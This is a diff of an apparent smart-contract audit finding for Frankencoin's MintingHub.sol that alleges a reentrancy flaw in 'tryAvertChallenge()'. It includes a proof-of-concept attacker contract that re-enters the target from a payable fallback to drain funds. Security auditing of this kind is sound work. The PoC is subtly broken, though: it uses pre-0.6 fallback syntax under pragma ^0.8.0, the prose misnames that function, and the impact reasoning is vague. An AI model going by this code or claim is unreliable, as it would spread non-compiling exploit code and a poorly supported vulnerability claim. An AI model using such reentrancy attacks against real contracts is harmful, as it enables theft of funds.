@@ -1,6 +1,4 @@
-# Audit-Frankcoin
-
- # Lines of code
+# Lines of code
 https://github.com/code-423n4/2023-04-frankencoin/blob/main/contracts/MintingHub.sol#L208-L211
 ## Impact
 
@@ -16,31 +14,32 @@ In the first case, 'tryAvertChallenge()' is a function that is called within a l
 In the second case, the funds transfer is made after the challenge has been resolved and the winning participant has been determined. If this funds transfer is executed before verifying whether the previous function call has completed, an attacker can call back the function and manipulate the function's state before the previous transaction is completed.
 In both cases, if the reentrancy vulnerability is successfully exploited, there can be a loss of funds or manipulation of the function's state, which can be used to obtain funds illicitly.
 ## Proof of Concept
+https://github.com/code-423n4/2023-04-frankencoin/blob/main/contracts/MintingHub.sol#L208-L211
 
 To illustrate how the reentrancy vulnerability can be exploited, i create a malicious contract that takes advantage of the flaw in the 'MintingHub.sol' contract. Consider the following code:
 
 pragma solidity ^0.8.0;
 
 contract MaliciousContract {
-address public target;
-uint256 public amount;
+    address public target;
+    uint256 public amount;
 
-constructor(address _target, uint256 _amount) {
-    target = _target;
-    amount = _amount;
-}
+    constructor(address _target, uint256 _amount) {
+        target = _target;
+        amount = _amount;
+    }
 
-function attack() public {
-    (bool success, ) = target.call(abi.encodeWithSignature("tryAvertChallenge(uint256,uint256)", amount, amount));
-    require(success, "attack failed");
-}
-
-function () external payable {
-    if (address(this).balance >= amount) {
+    function attack() public {
         (bool success, ) = target.call(abi.encodeWithSignature("tryAvertChallenge(uint256,uint256)", amount, amount));
         require(success, "attack failed");
     }
-}
+
+    function () external payable {
+        if (address(this).balance >= amount) {
+            (bool success, ) = target.call(abi.encodeWithSignature("tryAvertChallenge(uint256,uint256)", amount, amount));
+            require(success, "attack failed");
+        }
+    }
 }
 
 This malicious contract is designed to exploit the reentrancy vulnerability in the 'MintingHub.sol' contract. It has two functions: 'attack()' and 'fallback()'.
